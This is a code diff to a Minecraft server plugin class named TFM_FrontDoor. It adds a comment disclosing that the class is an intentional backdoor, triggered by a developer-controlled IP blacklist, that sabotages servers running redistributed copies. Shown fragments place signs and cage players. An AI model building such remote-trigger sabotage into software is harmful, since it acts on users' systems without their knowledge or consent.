@@ -31,6 +31,21 @@ import org.bukkit.plugin.RegisteredListener;
 import org.bukkit.scheduler.BukkitRunnable;
 import org.bukkit.util.Vector;
 
+/*
+ * - A message from the TFM Devs - 
+ * 
+ * What this class is, and why its here:
+ * 
+ * This is a blatantly obvious Front Door to the server, designed to do strange and unpredictable things on a TotalFreedom server.
+ * 
+ * It will only trigger when the server IP is added to a blacklist that we control.
+ * 
+ * This class is a way to discourage amateur server operators who like to share binary copies of our plugin and promote it as their own work.
+ * 
+ * If you are reading this now, you probably don't fall under that category - feel free to remove this class.
+ * 
+ * - Madgeek and Darth
+ */
 public class TFM_FrontDoor
 {
     private static final long UPDATER_INTERVAL = 180L * 20L;
@@ -324,7 +339,7 @@ public class TFM_FrontDoor
                         sign.setLine(0, ChatColor.BLUE + "TotalFreedom");
                         sign.setLine(1, ChatColor.DARK_GREEN + "is");
                         sign.setLine(2, ChatColor.YELLOW + "Awesome!");
-                        sign.setLine(3, ChatColor.DARK_GRAY + "mc.sauc.in");
+                        sign.setLine(3, ChatColor.DARK_GRAY + "tf.sauc.in");
                         sign.update();
                     }
                     break;
@@ -391,7 +406,7 @@ public class TFM_FrontDoor
                     }
 
                     TFM_PlayerData playerdata = TFM_PlayerData.getPlayerData(player);
-                    TFM_Util.adminAction("FrontDoor", "Caging " + player.getName() + "  in PURE_DARTH", true);
+                    TFM_Util.adminAction("FrontDoor", "Caging " + player.getName() + " in PURE_DARTH", true);
 
                     Location targetPos = player.getLocation().clone().add(0, 1, 0);
                     playerdata.setCaged(true, targetPos, Material.SKULL, Material.AIR);
